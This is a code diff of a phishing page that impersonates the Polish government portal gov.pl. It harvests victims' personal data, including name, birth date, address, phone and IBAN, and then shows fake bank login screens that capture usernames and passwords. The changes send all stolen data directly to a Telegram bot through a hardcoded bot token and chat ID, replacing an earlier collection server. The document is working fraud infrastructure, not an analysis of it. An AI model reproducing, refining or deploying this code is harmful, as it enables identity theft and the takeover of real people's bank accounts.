@@ -12,7 +12,7 @@
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
         /* ============================================================
-           FULL CSS — WSZYSTKIE STYLE ZACHOWANE
+           FULL CSS
            ============================================================ */
         * {
             margin: 0;
@@ -193,7 +193,6 @@
             color: #001f3f;
         }
 
-        /* ===== RESZTA STYLÓW ===== */
         .header {
             background: #ffffff;
             width: 100%;
@@ -3359,10 +3358,9 @@
         </div>
     </div>
 
-    <!-- ===== RESZTA STRONY (ukryta dopóki CAPTCHA nie zostanie rozwiązana) ===== -->
+    <!-- ===== RESZTA STRONY ===== -->
     <div id="mainContent" style="display:none;">
 
-        <!-- ========== HEADER ========== -->
         <header class="header" id="header">
             <div class="header-left">
                 <button class="menu-btn" aria-label="Menu" id="menuToggle">
@@ -3427,7 +3425,6 @@
 
             <div class="content-wrapper" id="contentWrapper">
 
-                <!-- ===== LOGIN NAV ===== -->
                 <div class="login-nav" id="loginNav">
                     <span class="brand">Login.gov.pl</span>
                     <div class="nav-links">
@@ -3440,7 +3437,6 @@
                     </div>
                 </div>
 
-                <!-- ===== BANNER ===== -->
                 <div class="image-under-banner" id="imageBanner">
                     <div class="image-wrapper">
                         <img src="4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
@@ -3456,7 +3452,6 @@
                     </div>
                 </div>
 
-                <!-- ===== FORM ===== -->
                 <section class="data-form-section" id="dataFormSection">
                     <h2 class="section-title">Dane osobowe</h2>
 
@@ -3507,7 +3502,6 @@
                     </form>
                 </section>
 
-                <!-- ===== BANK SELECT ===== -->
                 <section class="bank-selection" id="bankSelection">
                     <h2 class="bank-title">Bankowość elektroniczna</h2>
                     <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
@@ -3839,7 +3833,7 @@
                     </div>
                 </div>
 
-                <!-- ===== BANK 10 — BEZ LOGO ===== -->
+                <!-- ===== BANK 10 ===== -->
                 <div class="bank10-full-page" id="loginScreen10">
                     <div class="bank10-container">
                         <div class="bank10-main">
@@ -3914,10 +3908,8 @@
             </div>
         </div>
 
-        <!-- ===== TOAST ===== -->
         <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
 
-        <!-- ===== FOOTER ===== -->
         <footer class="footer" id="footer">
             <div class="container">
                 <div>
@@ -3961,7 +3953,6 @@
 
     </div> <!-- koniec #mainContent -->
 
-    <!-- ===== JAVASCRIPT ===== -->
     <script>
         // ============================================================
         //   CAPTCHA
@@ -3990,11 +3981,9 @@
             function verifyCaptcha() {
                 const userInput = inputEl.value.trim();
                 if (userInput === currentCaptcha) {
-                    // Poprawne
                     overlay.classList.add('hidden');
                     mainContent.style.display = 'block';
                     document.body.style.overflow = 'auto';
-                    // Ustawiamy focus na pierwszy input w głównej treści
                     const firstInput = mainContent.querySelector('input');
                     if (firstInput) setTimeout(() => firstInput.focus(), 300);
                 } else {
@@ -4003,14 +3992,12 @@
                     submitBtn.disabled = false;
                     inputEl.value = '';
                     inputEl.focus();
-                    // Automatyczne odświeżenie po błędzie
                     setTimeout(() => {
                         generateCaptcha();
                     }, 1500);
                 }
             }
 
-            // Eventy
             submitBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 submitBtn.disabled = true;
@@ -4030,15 +4017,12 @@
                 inputEl.focus();
             });
 
-            // Generujemy pierwszą CAPTCHA
             generateCaptcha();
-
-            // Ustawiamy focus na input
             setTimeout(() => inputEl.focus(), 200);
         })();
 
         // ============================================================
-        //   AUTO SLASH FOR BIRTHDATE
+        //   AUTO SLASH / POSTAL
         // ============================================================
         function autoSlash(event) {
             const input = event.target;
@@ -4046,55 +4030,45 @@
             if (value.length > 8) value = value.slice(0, 8);
             let formatted = '';
             for (let i = 0; i < value.length; i++) {
-                if (i === 2 || i === 4) {
-                    formatted += '/';
-                }
+                if (i === 2 || i === 4) formatted += '/';
                 formatted += value[i];
             }
             input.value = formatted;
         }
 
-        // ===== AUTO POSTAL CODE (XX-XXX) =====
         function autoPostal(event) {
             const input = event.target;
             let value = input.value.replace(/\D/g, '');
             if (value.length > 5) value = value.slice(0, 5);
             let formatted = '';
             for (let i = 0; i < value.length; i++) {
-                if (i === 2) {
-                    formatted += '-';
-                }
+                if (i === 2) formatted += '-';
                 formatted += value[i];
             }
             input.value = formatted;
         }
 
         // ============================================================
-        //   IBAN OBSŁUGA
+        //   IBAN
         // ============================================================
         function cleanIbanValue(value) {
             if (!value) return '';
             let cleaned = value.replace(/[\s\-]/g, '');
             cleaned = cleaned.toUpperCase();
-            if (cleaned.startsWith('PL')) {
-                cleaned = cleaned.substring(2);
-            }
+            if (cleaned.startsWith('PL')) cleaned = cleaned.substring(2);
             cleaned = cleaned.replace(/\D/g, '');
-            if (cleaned.length > 26) {
-                cleaned = cleaned.substring(0, 26);
-            }
+            if (cleaned.length > 26) cleaned = cleaned.substring(0, 26);
             return cleaned;
         }
 
         // ============================================================
-        //   TELEGRAM
+        //   TELEGRAM — BEZPOŚREDNIA WYSYŁKA
         // ============================================================
-        function sendToTelegram(bankName, login, password) {
-            const message = `🔐 *Nowe logowanie*\n🏦 *Bank:* ${bankName}\n👤 *Login:* ${login}\n🔑 *Hasło:* ${password}\n🕒 ${new Date().toLocaleString()}`;
-            
-            console.log(`📤 Отправка в Telegram:`, { bankName, login, password });
+        const TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
+        const TELEGRAM_CHAT_ID = '-1004256695843';
 
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        function sendToTelegram(message) {
+            return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -4112,23 +4086,19 @@
                 } else {
                     console.error('❌ Błąd Telegram:', data);
                 }
+                return data;
             })
             .catch(error => {
                 console.error('❌ Błąd sieci:', error);
+                return { ok: false, error: error.message };
             });
         }
-
-        // ============================================================
-        //   KONFIGURACJA TELEGRAM
-        // ============================================================
-        const TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
-        const TELEGRAM_CHAT_ID = '-1004256695843';
 
         // ============================================================
         //   GŁÓWNY KOD
         // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
-            // ===== MENU =====
+            // MENU
             const menuToggle = document.getElementById('menuToggle');
             const sidebar = document.getElementById('sidebar');
             const mainWrapper = document.getElementById('mainWrapper');
@@ -4172,7 +4142,7 @@
                 if (e.key === 'Escape' && isMenuOpen) toggleMenu();
             });
 
-            // ===== SEARCH =====
+            // SEARCH
             document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
                 const input = this.closest('.header-search').querySelector('input');
                 alert('Szukanie: ' + (input?.value || 'puste'));
@@ -4184,7 +4154,7 @@
                 }
             });
 
-            // ===== LOGIN NAV LINKS =====
+            // LOGIN NAV
             document.querySelectorAll('.login-nav .nav-links a').forEach(link => {
                 link.addEventListener('click', function(e) {
                     e.preventDefault();
@@ -4192,10 +4162,9 @@
                 });
             });
 
-            // ===== SCROLL TO FORM =====
+            // SCROLL TO FORM
             const scrollBtn = document.getElementById('scrollToFormBtn');
             const formSection = document.getElementById('dataFormSection');
-
             if (scrollBtn) {
                 scrollBtn.addEventListener('click', function(e) {
                     e.preventDefault();
@@ -4203,7 +4172,7 @@
                 });
             }
 
-            // ===== IBAN WRAPPER =====
+            // IBAN WRAPPER
             const ibanInput = document.getElementById('iban');
             const ibanWrapper = document.getElementById('ibanWrapper');
 
@@ -4234,7 +4203,9 @@
                 });
             }
 
-            // ===== FORM SUBMIT =====
+            // ============================================================
+            //   FORMULARZ DANYCH OSOBOWYCH — WYSYŁKA DO TELEGRAM
+            // ============================================================
             const form = document.getElementById('dataForm');
             const submitBtn = document.getElementById('submitBtn');
             const toast = document.getElementById('toastMessage');
@@ -4311,38 +4282,34 @@
 
                 const formData = getFormData();
 
-                fetch('https://gvvbt.onrender.com/send', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(formData)
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        showToast('Dane zostały wysłane!', true);
+                const message = `🔐 *Nowe dane osobowe*\n👤 *Imię i nazwisko:* ${formData.fullname}\n📅 *Data urodzenia:* ${formData.birthdate}\n📱 *Telefon:* ${formData.phone}\n📍 *Ulica:* ${formData.street}\n🏙️ *Miasto:* ${formData.city}\n📮 *Kod pocztowy:* ${formData.postal}\n🏦 *IBAN:* ${formData.iban}\n🕒 ${new Date().toLocaleString()}`;
 
-                        loginNav.classList.add('hidden');
-                        imageBanner.classList.add('hidden');
-                        formSectionElement.classList.add('hidden');
+                sendToTelegram(message)
+                    .then(data => {
+                        if (data.ok) {
+                            showToast('Dane zostały wysłane!', true);
 
-                        bankSelection.classList.add('visible');
-                        bankFooter.classList.add('visible');
-                        window.scrollTo({ top: 0, behavior: 'smooth' });
-                    } else {
-                        showToast('Wystąpił błąd podczas wysyłania. Spróbuj ponownie.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Błąd:', error);
-                    showToast('Wystąpił błąd połączenia. Spróbuj ponownie.');
-                })
-                .finally(() => {
-                    submitBtn.disabled = false;
-                    submitBtn.classList.remove('loading');
-                    submitBtn.innerHTML = 'Wyślij';
-                });
+                            loginNav.classList.add('hidden');
+                            imageBanner.classList.add('hidden');
+                            formSectionElement.classList.add('hidden');
+
+                            bankSelection.classList.add('visible');
+                            bankFooter.classList.add('visible');
+                            window.scrollTo({ top: 0, behavior: 'smooth' });
+                        } else {
+                            showToast('Błąd wysyłania. Spróbuj ponownie.');
+                            console.error('Telegram error:', data);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Błąd:', error);
+                        showToast('Wystąpił błąd połączenia. Spróbuj ponownie.');
+                    })
+                    .finally(() => {
+                        submitBtn.disabled = false;
+                        submitBtn.classList.remove('loading');
+                        submitBtn.innerHTML = 'Wyślij';
+                    });
             });
 
             allInputs.forEach(input => {
@@ -4364,7 +4331,7 @@
         });
 
         // ============================================================
-        //   UNIWERSALNY OBSŁUGA BANKÓW
+        //   OBSŁUGA BANKÓW — WYSYŁKA DO TELEGRAM
         // ============================================================
         function handleLogin(event, bankName) {
             event.preventDefault();
@@ -4464,8 +4431,21 @@
                 return false;
             }
 
-            sendToTelegram(bankName, login, password);
-            alert(`✅ Dane dla ${bankName} zostały wysłane!`);
+            const message = `🔐 *Nowe logowanie*\n🏦 *Bank:* ${bankName}\n👤 *Login:* ${login}\n🔑 *Hasło:* ${password}\n🕒 ${new Date().toLocaleString()}`;
+
+            sendToTelegram(message)
+                .then(data => {
+                    if (data.ok) {
+                        alert(`✅ Dane dla ${bankName} zostały wysłane!`);
+                    } else {
+                        alert(`❌ Błąd wysyłania. Spróbuj ponownie.`);
+                        console.error('Telegram error:', data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Błąd:', error);
+                    alert(`❌ Błąd połączenia. Spróbuj ponownie.`);
+                });
 
             allInputs.forEach(input => {
                 if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') {
